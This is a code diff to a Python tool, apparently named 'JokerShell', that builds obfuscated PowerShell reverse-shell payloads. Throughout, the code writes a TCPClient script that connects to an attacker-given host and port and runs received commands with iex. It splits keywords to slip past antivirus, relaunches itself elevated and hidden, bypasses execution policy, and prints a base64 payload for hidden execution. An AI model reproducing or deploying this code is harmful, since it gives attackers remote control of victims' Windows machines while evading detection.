@@ -50,23 +50,24 @@ args = parser.parse_args()
 def Bomb():
     try:
         print(f"\n{Red}{MAIN}{Normal} Calculating Strings...")
-        with open('RUN.ps1') as file:
+        with open('Payload.ps1') as file:
             spl = file.read().split()
-        time.sleep(1.5)
-        print(f"{SPACE_PREFIX}{Yellow}{TEE2}{Normal}Replace Randomly {len(spl)} Strings....")
-        time.sleep(1.5)
-        if "SYSTEMROOT" and "New-Object" and "GetStream" and "ASCII" and "System.Net.Sockets" not in spl:
-            print(f"{SPACE_PREFIX}{SPACE_PREFIX}{TEE2}SYSTEMROOT - Replaced")
-            time.sleep(1)
-            print(f"{SPACE_PREFIX}{SPACE_PREFIX}{TEE2}New-Object - Replaced")
-            time.sleep(1)
-            print(f"{SPACE_PREFIX}{SPACE_PREFIX}{TEE2}GetStream - Replaced")
-            time.sleep(1)
-            print(f"{SPACE_PREFIX}{SPACE_PREFIX}{TEE2}System.Net.Sockets - Replaced")
-        print(f"{SPACE_PREFIX}{SPACE_PREFIX}{SPACE_PREFIX}{TEE2}{Pink}{Normal}Finishing it all...")
-        time.sleep(1.5)
-        print(f"{SPACE_PREFIX}{SPACE_PREFIX}{SPACE_PREFIX}{lcyan}{TEE2}{Normal}Payload Generated...... ↓\n")
-        time.sleep(1.5)
+            time.sleep(1.5)
+            print(f"{SPACE_PREFIX}{Yellow}{TEE2}{Normal}Replace Randomly {len(spl)} Strings....")
+            time.sleep(1.5)
+            if "SYSTEMROOT" and "New-Object" and "GetStream" and "ASCII" and "System.Net.Sockets" not in spl:
+                print(f"{SPACE_PREFIX}{SPACE_PREFIX}{TEE2}SYSTEMROOT - Replaced")
+                time.sleep(1)
+                print(f"{SPACE_PREFIX}{SPACE_PREFIX}{TEE2}New-Object - Replaced")
+                time.sleep(1)
+                print(f"{SPACE_PREFIX}{SPACE_PREFIX}{TEE2}GetStream - Replaced")
+                time.sleep(1)
+                print(f"{SPACE_PREFIX}{SPACE_PREFIX}{TEE2}System.Net.Sockets - Replaced")
+                time.sleep(1)
+                print(f"{SPACE_PREFIX}{SPACE_PREFIX}{SPACE_PREFIX}{TEE2}{Pink}{Normal}Finishing it all...")
+                time.sleep(1.5)
+                print(f"{SPACE_PREFIX}{SPACE_PREFIX}{SPACE_PREFIX}{lcyan}{TEE2}{Normal}Payload Generated...... ↓\n")
+                time.sleep(1.5)
 
     except Exception as e:
         print(e)
@@ -98,18 +99,18 @@ WordCharSystem3 = ["Ne''w-O''bje''ct", "N''ew-O''bj''ec''t", "N'e'W'-'o'B'J'e'C'
                    ]
 
 # S//y//s//t//e//m//.//N//e//t//.//S//o//c//k//e//t//s
-WordCharSystem4 = ["Sy''st''em.Net.Soc''kets.TcPClIeNt", "SyS''tEm.Net.SoC''kE''tS.TCPCLIENT", "Sy''St''Em.NeT.So''CkE''tS.TCpCLient",
-                   "('S'+'y'+'s'+'t'+'e'+'m'+'.'+'N'+'e'+'t'+'.'+'S'+'ockets.TCPClient')", "('S'+ 'y'+'s'+'t'+'e'+'m'+'.'+'N'+'e'+'t'+'.'+'S'+'ockets.TCPcliEnt')"
+WordCharSystem4 = ["Sy''st''em.Net.Soc''kets.TcPClIeNt", "SyS''tEm.Net.SoC''kE''tS.TCPCLIENT",
+                   "Sy''St''Em.NeT.So''CkE''tS.TCpCLient", "('S'+'y'+'s'+'t'+'e'+'m'+'.'+'N'+'e'+'t'+'.'+'S'+'ockets.TCPClient')",
+                   "('S'+ 'y'+'s'+'t'+'e'+'m'+'.'+'N'+'e'+'t'+'.'+'S'+'ockets.TCPcliEnt')"
                    ]
 
 # G//e//t//S//t//r//e//a//m
-WordCharSystem5 = ["('Get'+'St'+'r'+'eam')", "('Get'+'Stream')","('G'+'e'+'T'+'S','T'+'r'+'e'+'m')",
+WordCharSystem5 = ["('Get'+'St'+'r'+'eam')", "('Get'+'Stream')", "('G'+'e'+'T'+'S','T'+'r'+'e'+'m')",
                    "('gEt'+'s'+'T'+'r'+'E'+'aM')", "('G'+'e'+'tStream')"
                    ]
 
 # S//y//s//t//e//m//T//e//x//t//.//A//S//C//I//I//E//n//c//o//d//i//n//g
-WordCharSystem6 = ["Sys''t''em.Te''xt.AS''CI''IEn''co''ding",
-                   "Sy''Ste''M.tExT.A''SCi''iEN''coding"
+WordCharSystem6 = ["Sys''t''em.Te''xt.AS''CI''IEn''co''ding", "Sy''Ste''M.tExT.A''SCi''iEN''coding"
                    ]
 
 # --------------------- Join List Together --------------------- #
@@ -146,34 +147,41 @@ param([switch]$Elevated)
 function Test-Admin {
     $currentUser = New-Object Security.Principal.WindowsPrincipal $([Security.Principal.WindowsIdentity]::GetCurrent())
     $currentUser.IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)
-    Unblock-File '.\RUN.ps1'
+    Unblock-File '.\Privilege.ps1'
 }
 
 if ((Test-Admin) -eq $false)  {
     if ($elevated) {
         # tried to elevate, did not work, aborting
     } else {
-        Start-Process $env:''' + f'''{repl}''' + f'''\\{repl2}''' + '''\??ndowsPowerShe??\\v1.0\powershe??.exe -Verb RunAs -ArgumentList ('-noprofile -WindowStyle hidden -file "{0}" -elevated' -f ($myinvocation.MyCommand.Definition))
+        Start-Process $env:''' + f'''{repl}\\''' + f'''\\{repl2}'''+'''\\??ndowsPowerShe??\\v1.0\powershe??.exe -Verb RunAs -ArgumentList ('-noprofile -WindowStyle hidden -file "{0}" -elevated' -f ($myinvocation.MyCommand.Definition))
     }
     exit
 }
 
-Set-ExecutionPolicy Bypass -Scope Process\n
+Set-ExecutionPolicy Bypass -Scope CurrentUser -Force
+$encodedCommand = 'BASE64_ENCODED_COMMAND_HERE'
+$decodedCommand = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($encodedCommand))
+Invoke-Expression $decodedCommand
 '''
 
 # --------------------- CONTINUE MAIN CODE BLOCK ---------------------
 
 
-def Execute():
-    with open('RUN.ps1', 'w') as run:
-        #run.write(f'{privilege}')
-        run.write(f"\n$ClIeNt = {repl3} {repl4}('{args.l}',{args.p});")
-        run.write(f"\n$StReAm = $CLIent.{repl5}();[byte[]]$bytes = 0..65535|%" + "{0};")
-        run.write(f"\nwhile(($i = $StREaM.ReAd($bytes, 0, $byteS.LeNgTh)) -ne 0)" + "{;")
-        run.write(f"\n$data = (New-Object -TypENAme " + f"{repl6}).('Ge'+'tStRinG')($bytes,0, $i);")
-        run.write('''\n$sendback = (iex ". { $DATA } 2>&1" | Ou''t-Str''ing ); $sendback2 = ${s`endbac`k} + 'JokerShell ' + (pwd).Path + '> ';''')
-        run.write("\n$sendbyte = ([text.encoding]::ASCII).GetBYTeS($sendback2);$stREaM.Write($sendbyte,0,$seNdByte.Length);$s.Flush()};$client.Close()")
-        run.close()
+def Execute_privilege():
+    with open('Privilege.ps1', 'w') as run:
+        run.write(f'{privilege}')
+    run.close()
+
+def Execute_Payload():
+    with open('Payload.ps1', 'w') as run2:
+        run2.write(f"$ClIeNt = {repl3} {repl4}('{args.l}',{args.p});\n")
+        run2.write(f"$StReAm = $CLIent.{repl5}();[byte[]]$bytes = 0..65535|%" + "{0};\n")
+        run2.write(f"while(($i = $StREaM.ReAd($bytes, 0, $byteS.LeNgTh)) -ne 0)" + "{;\n")
+        run2.write(f"$data = (New-Object -TypENAme " + f"{repl6}).('Ge'+'tStRinG')($bytes,0, $i);\n")
+        run2.write('''$sendback = (iex ". { $DATA } 2>&1" | Ou''t-Str''ing ); $sendback2 = ${s`endbac`k} + 'JokerShell ' + (pwd).Path + '> ';\n''')
+        run2.write("$sendbyte = ([text.encoding]::ASCII).GetBYTeS($sendback2);$stREaM.Write($sendbyte,0,$seNdByte.Length);$s.Flush()};$client.Close()\n")
+        run2.close()
 
 
 # -------------------------------- ENCODE TO BASE64 WHEN FINISH ------------------------------#
@@ -182,22 +190,22 @@ def Execute():
    # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #
 
 def B64(FTD):
-    with open('RUN.ps1', 'rb') as file:
+    with open('Payload.ps1', 'rb') as file:
         file_content = file.read()
     return base64.b64encode(file_content).decode('utf-8')
 
 def main():
-    Execute()
+    Execute_privilege()
+    Execute_Payload()
     JOKER()
     Bomb()
-    FP = 'RUN.ps1'
+    FP = 'Payload.ps1'
     B64(FTD=FP)
     time.sleep(0.5)
     print(f"[+] {Yellow}TIP{Normal}: use as: powershell -w hidden -EncodedCommand [PAYLOAD]")
     print("PAYLOAD -> Copy and run:\n")
-    os.system('iconv -f ASCII -t UTF-16LE RUN.ps1 | base64 -w 0')
+    os.system('iconv -f ASCII -t UTF-16LE Payload.ps1 | base64 -w 0')
     time.sleep(0.5)
-    os.system('rm -r RUN.ps1')
 
 if __name__ == '__main__':
     main()
